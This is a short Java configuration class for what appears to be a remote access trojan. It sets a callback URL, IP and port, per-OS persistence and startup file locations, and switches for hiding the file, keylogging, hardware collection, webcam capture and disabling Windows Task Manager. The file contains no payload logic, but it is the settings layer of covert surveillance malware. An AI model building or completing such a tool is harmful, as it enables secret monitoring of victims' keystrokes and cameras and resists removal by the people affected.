package com.Volara;

import java.io.File;

/**
 * Created by Kevin on 4/5/2017.
 */
public class profile {
    //Config
    public static String appid = "12345678asdfghjk";
    public static String backup_connURL = "http://devkev.tk";
    public static String directIP = "127.0.0.1";
    public static String directPORT = "44435";

    //Persistance
    public static boolean persistant = true;
    public static String persistantLoc_MAC = "~" + File.pathSeparator + "Desktop";
    public static String persistantName_MAC = "testp";
    public static String persistantLoc_WIN = "~" + File.pathSeparator + "Desktop";
    public static String persistantName_WIN = "testp";
    public static String persistantLoc_LIN = "";
    public static String persistantName_LIN = "";
    public static String persistantLoopTime = "5000";

    //Startup
    public static boolean startup = false;
    public static String fileLoc_MAC = "~" + File.pathSeparator + "Desktop";
    public static String fileName_Mac = "JarTest";
    public static String fileLoc_WIN = "~" + File.pathSeparator + "Desktop";
    public static String fileName_WIN = "test";
    public static String fileLoc_LIN = "";
    public static String fileName_LIN = "";

    //Features
    public static boolean hideFile = true;
    public static boolean debug = true;
    public static boolean backup = true;
    public static boolean keylog = false;
    public static boolean hardware = true;
    public static boolean webcam = true;

    //Windows
    public static boolean disTaskmgr = false;
}
